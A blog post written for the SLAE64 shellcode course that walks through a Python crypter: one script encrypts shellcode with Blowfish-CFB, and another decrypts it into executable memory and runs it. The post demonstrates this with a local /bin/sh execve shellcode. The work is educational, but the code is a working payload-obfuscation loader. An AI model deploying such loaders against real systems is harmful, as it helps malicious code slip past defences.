Assignment #7 - Crypters
========================

For this assignment I had to create a crypter, i.e. a program to encrypt a shellcode. This encrypted shellcode can then be decrypted and executed at runtime. Any encryption algorithm and programming language could be used. I chose to use [Blowfish][wikipedia_blowfish] in [Cipher Feedback mode][wikipedia_cfb] (CFB).

I could have implemented Blowfish myself, but I decided that was out of scope for this course. Instead I used [this implementation][github_blowfish]. To use it you just have to install it with `pip3 install --user blowfish`.

My crypter can be seen below.

    #!/usr/bin/env python3
    import sys
    import blowfish

    key = bytes(sys.argv[1], 'utf-8')
    shellcode = bytes.fromhex(sys.argv[2].replace('\\x', ''))

    iv = b'\x00\x00\x00\x00\x00\x00\x00\x00' #urandom(8)
    cipher = blowfish.Cipher(key)
    blocks = cipher.encrypt_cfb(shellcode, iv)

    output = []
    for block in blocks:
        for byte in block:
            output.append(byte)

    print()
    print(''.join(['\\x{:02x}'.format(b) for b in output]))
    print()
    print(','.join(['0x{:02x}'.format(b) for b in output]))

It expects two arguments. The first is the key (or password) with which the shellcode will be encrypted. The second is the shellcode to encrypt. As an example we can encrypt an `execve` stack shellcode:

    $ ./blowfish-encrypt.py pass '\x31\xc0\x50\x54\x5a\x48\xbe\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x54\x5f\x50\x57\x54\x5e\xb0\x3b\x0f\x05' | fold

    \x03\x89\xc1\xa0\xbf\xb6\xdb\x63\xa8\xa2\xb3\x21\x18\x0e\x2e\x42\xdc\x7a\x58\x12
    \x13\xe5\xb3\x7e\xed\x33

    0x03,0x89,0xc1,0xa0,0xbf,0xb6,0xdb,0x63,0xa8,0xa2,0xb3,0x21,0x18,0x0e,0x2e,0x42,
    0xdc,0x7a,0x58,0x12,0x13,0xe5,0xb3,0x7e,0xed,0x33

As a note, CFB expects an [initialisation vector][wikipedia_iv] (IV) which should be random. The IV guarantees that multiple ciphertexts can be generated for a given plaintext and key. The IV used to encrypt the plaintext must be known to decrypt it. The easiest way is to use a fixed IV, which I did here. But of course it's not the most secure. We're relying on the key alone here, which I think is enough for our purpose.

Decrypting and executing
------------------------

The script to decrypt and execute the shellcode can be seen below.

    #!/usr/bin/env python3
    import sys
    import blowfish
    import mmap
    import ctypes

    key = bytes(sys.argv[1], 'utf-8')
    enc_shellcode = bytes.fromhex(sys.argv[2].replace('\\x', ''))

    iv = b'\x00\x00\x00\x00\x00\x00\x00\x00' #urandom(8)
    cipher = blowfish.Cipher(key)
    blocks = cipher.decrypt_cfb(enc_shellcode, iv)

    shellcode = []
    for block in blocks:
        for byte in block:
            shellcode.append(byte)

    shellcode_bytes = bytes(shellcode)

    # execute shellcode
    exec_mem = mmap.mmap(-1, len(shellcode_bytes), prot = mmap.PROT_READ |
            mmap.PROT_WRITE | mmap.PROT_EXEC, flags = mmap.MAP_ANONYMOUS |
            mmap.MAP_PRIVATE)
    exec_mem.write(shellcode_bytes)

    ctypes_buffer = ctypes.c_int.from_buffer(exec_mem)
    func = ctypes.CFUNCTYPE(ctypes.c_int64)(ctypes.addressof(ctypes_buffer))
    func._avoid_gc_for_mmap = exec_mem

    func()

The first part decrypts and the second executes. The first argument to the script is the password and the second is the encrypted shellcode. As an example let's execute the payload we encrypted before:

    $ ./blowfish-execute.py pass '\x03\x89\xc1\xa0\xbf\xb6\xdb\x63\xa8\xa2\xb3\x21\x18\x0e\x2e\x42\xdc\x7a\x58\x12\x13\xe5\xb3\x7e\xed\x33'
    sh-5.0$ whoami
    goncalor

We can see it spawned a shell as expected.

That's all for this assignment. I hope you enjoyed it.


[wikipedia_blowfish]: https://en.wikipedia.org/wiki/Blowfish_(cipher)
[wikipedia_cfb]: https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Feedback_(CFB)
[wikipedia_iv]: https://en.wikipedia.org/wiki/Initialization_vector
[github_blowfish]: https://github.com/jashandeep-sohi/python-blowfish

----

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert][SLAE64] certification.

Student ID: SLAE64-1635

[SLAE64]: https://www.pentesteracademy.com/course?id=7
